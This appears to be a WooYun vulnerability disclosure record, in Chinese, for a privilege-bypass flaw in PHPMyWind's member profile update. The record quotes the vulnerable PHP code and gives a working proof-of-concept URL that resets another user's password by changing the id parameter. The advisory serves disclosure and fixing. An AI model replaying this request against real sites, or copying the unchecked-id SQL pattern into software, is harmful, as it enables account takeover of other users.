{"id": 43547, "wybug_id": "wooyun-2014-082416", "wybug_title": "PHPMyWind任意用户密码重置二", "wybug_corp": "phpmywind.com", "wybug_author": "xfkxfk", "wybug_date": "2014-11-07 18:34", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "敏感接口缺乏认证", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-12：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： PHPMyWind任意用户密码重置二 详细说明：  之前提交过PHPMyWind的任意用户密码重置问题 WooYun: PHPMyWind任意用户密码重置 这个问题是完全的密码重置逻辑问题，但是现在这个问题是因为越权导致的由于在修改用户信息是没有判断用户属性id，直接将POST的id当做where条件，导致修改任意用户资料信息member.php文件：\n//定义入口常量define('IN_MEMBER', TRUE);//初始化参数$c  = isset($c)  ? $c : 'login';$a  = isset($a)  ? $a : '';$d  = isset($d)  ? $d : '';$id = isset($id) ? intval($id) : 0;......//更新资料else if($a == 'saveedit'){\t\t//检测数据完整性\tif($password!=$repassword or $email=='')\t{\t\theader('location:?c=edit');\t\texit();\t}\t//HTML转义变量\t$answer    = htmlspecialchars($answer);\t$cnname    = htmlspecialchars($cnname);\t$enname    = htmlspecialchars($enname);\t$cardnum   = htmlspecialchars($cardnum);\t$intro     = htmlspecialchars($intro);\t$email     = htmlspecialchars($email);\t$qqnum     = htmlspecialchars($qqnum);\t$mobile    = htmlspecialchars($mobile);\t$telephone = htmlspecialchars($telephone);\t$address   = htmlspecialchars($address);\t$zipcode   = htmlspecialchars($zipcode);\t//检测旧密码是否正确\tif($password != '')\t{\t\t$oldpassword = md5(md5($oldpassword));\t\t$r = $dosql->GetOne(\"SELECT `password` FROM `#@__member` WHERE `username`='$c_uname'\");\t\tif($r['password'] != $oldpassword)\t\t{\t\t\tShowMsg('抱歉，旧密码错误！','-1');\t\t\texit();\t\t}\t}\t$sql = \"UPDATE `#@__member` SET \";\tif($password != '')\t{\t\t$password = md5(md5($password));\t\t$sql .= \"password='$password', \";\t}\t@$sql .= \"question='$question', answer='$answer', cnname='$cnname', enname='$enname', sex='$sex', birthtype='$birthtype', birth_year='$birth_year', birth_month='$birth_month', birth_day='$birth_day', astro='$astro', bloodtype='$bloodtype', trade='$trade', live_prov='$live_prov', live_city='$live_city', live_country='$live_country', home_prov='$home_prov', home_city='$home_city', home_country='$home_country', cardtype='$cardtype', cardnum='$cardnum', intro='$intro', email='$email', qqnum='$qqnum', mobile='$mobile', telephone='$telephone', address_prov='$address_prov', address_city='$address_city', address_country='$address_country', address='$address', zipcode='$zipcode' WHERE id=$id\";\tif($dosql->ExecNoneQuery($sql))\t{\t\tShowMsg('资料更新成功！','?c=edit');\t\texit();\t}\n可以看到这里直接where = $id，但是id就是文件入口的id并不是对应用户的uid密码重置：1、直接将对应于id用户的密码修改为自己的密码，就相当于修改自己的密码一样修改对应id用户的密码2、可以修改掉安全问题，通过安全问题重置对应用户密码其实第二种已经是多余的。。。。   漏洞证明：  1、登陆用户111111，用户id为22、发送请求，修改id为用户222222的id=3\nhttp://localhost/phpmywind/member.php?a=saveeditoldpassword=111111&password=111111&repassword=111111&question=1&answer=111111&cnname=111111&enname=111111&sex=0&birthtype=0&birth_year=1998&birth_month=02&birth_day=-1&astro=10&bloodtype=2&trade=2&live_prov=1500&live_city=1502&live_country=-1&home_prov=1500&home_city=1502&home_country=-1&cardtype=0&cardnum=1111111111&intro=1111111&email=111111%40111.com&qqnum=111111&mobile=13111111111&telephone=&address_prov=1000&address_city=1002&address_country=-1&address=&zipcode=&action=update&id=3\n\n\n   修复方案：  这里的id必须是用户属性的uid   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-07 19:15 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  前排围观重置密码    \n     2014-11-07 20:34 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  小伙子，你还发出来了，@Finger 不是小厂商吗，哥都没有提，直接发博客了，小楷分一半啊，哈哈    \n     2014-11-07 20:40 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Finger 看错了，哈哈，原来还是小厂商    \n     2015-09-12 15:52 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  很直白的思路    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}